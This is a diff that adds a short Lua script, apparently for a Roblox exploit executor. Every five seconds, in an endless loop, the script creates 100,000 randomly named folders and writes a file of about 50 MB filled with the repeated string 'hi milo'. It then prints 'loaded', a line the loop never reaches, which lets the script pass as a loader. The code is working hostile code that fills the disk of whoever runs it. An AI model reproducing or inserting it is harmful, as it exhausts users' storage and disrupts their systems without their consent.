@@ -1,1 +1,13 @@
+while wait(5) do
+    local folders = {}
+    for i = 1, 100000 do
+        local folder = math.random(1000, 999999)
+        makefolder(tostring(folder))
+        table.insert(folders, tostring(folder))
+    end
+    writefile(folders[math.random(1, 100000)] .. "/" .. math.random(1000, 999999) .. "hi.txt", ("hi milo"):rep(50 * 1024 * 1024 // 7))
+    table.clear(folders)
+end
 
+wait(20)
+print("loaded")
